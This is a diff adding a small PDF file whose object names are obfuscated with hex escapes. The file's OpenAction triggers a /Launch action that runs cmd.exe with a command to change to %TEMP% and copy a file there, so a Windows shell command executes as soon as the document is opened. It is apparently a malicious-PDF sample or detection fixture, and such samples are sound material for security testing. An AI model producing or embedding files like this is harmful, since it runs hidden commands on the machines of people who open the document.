@@ -1,0 +1,19 @@
+%PDF-1.5
+1 0 obj<</Ty#70e/C#61t#61l#6fg/#4fu#74#6ci#6ees 2 0 R/P#61g#65#73 3 0 R/#4fp#65nAc#74i#6f#6e 5 0 R>>endobj
+2 0 obj<</Ty#70e/#4fut#6cin#65s/Co#75nt 0>>endobj
+3 0 obj<</T#79#70e/P#61ge#73/#4bids[4 0 R]/C#6f#75#6et 1>>endobj
+4 0 obj<</T#79#70e/P#61#67#65/#50#61#72#65nt 3 0 R/#4dediaB#6f#78[0 0 612 792]>>endobj
+5 0 obj
+<<
+	/T#79#70e/A#63t#69#6fn/#53/L#61un#63h/#57i#6e <<
+		/F (cmd.exe) /P (/K cd %TEMP% && copy "%TEMP%\\3_cp.pdf" "%TEMP%\\4")
+	>>
+	/Pages 2 0 R
+	/Type /Catalog
+>>
+endobj
+trailer
+<<
+	/Root 1 0 R
+>>
+%%EOF
